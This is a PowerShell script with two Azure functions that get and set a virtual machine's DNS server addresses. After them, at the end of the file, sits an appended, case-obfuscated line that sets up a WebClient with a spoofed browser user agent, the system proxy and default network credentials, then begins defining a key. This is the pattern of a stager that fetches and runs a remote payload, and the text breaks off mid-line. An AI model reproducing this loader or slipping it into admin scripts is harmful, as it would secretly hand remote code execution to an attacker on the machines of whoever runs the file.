


function Get-AzrDnsServerAddress
{
	[CmdletBinding()]
	[OutputType('Microsoft.Azure.Commands.Network.Models.PSNetworkInterfaceDnsSettings')]
	param
	(
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[string]$VMName,
		
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string]$ResourceGroupName
	)
	
	if ($PSBoundParameters.ContainsKey('ResourceGroupName'))
	{
		$getParams = @{
			'ResourceGroupName' = $ResourceGroupName
			'VMName' = $VMName
		}
		$vm = Get-AzureRmVM -VMName $VMName -ResourceGroupName $ResourceGroupName
	}
	else
	{
		if (-not ($vm = Get-AzureRmVM | Where-Object { $_.Name -eq $VMName }))
		{
			throw "The VM [$($VMName)] was not found."
		}
	}
	
	
	$vnic = $vm | Get-AzureRmNetworkInterface
	$vnic.DnsSettings.AppliedDnsServers
}

function Set-AzrDnsServerAddress
{
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[string]$VMName,
		
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[string[]]$IpAddress,
		
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[switch]$Restart,
		
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string]$ResourceGroupName
		
	)
	
	
	if ($PSBoundParameters.ContainsKey('ResourceGroupName'))
	{
		$getParams = @{
			'ResourceGroupName' = $ResourceGroupName
			'VMName' = $VMName
		}
		$vm = Get-AzureRmVM -VMName $VMName -ResourceGroupName $ResourceGroupName
	}
	else
	{
		if (-not ($vm = Get-AzureRmVM | Where-Object { $_.Name -eq $VMName }))
		{
			throw "The VM [$($VMName)] was not found."
		}
	}
	
	
	if ((Get-AzrDnsServerAddress -VMName $VMName) -ne $IpAddress)
	{
		Write-Verbose -Message 'Changing DNS settings...'
		$vnic = $vm | Get-AzureRmNetworkInterface
		$vnic.DnsSettings.DnsServers = $IpAddress
		$null = $vnic | Set-AzureRmNetworkInterface
		if (-not $Restart.IsPresent)
		{
			Write-Warning -Message 'vNIC has been updated but -Restart was not chosen. The VM will not see these new DNS servers until it has been restarted.'
		}
		else
		{
			Write-Verbose -Message 'Restarting VM after successful vNIC change...'
			$vm | Restart-AzureRmVM
		}
	}
	else
	{
		Write-Verbose -Message 'DNS settings are already set.'
	}
}
$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

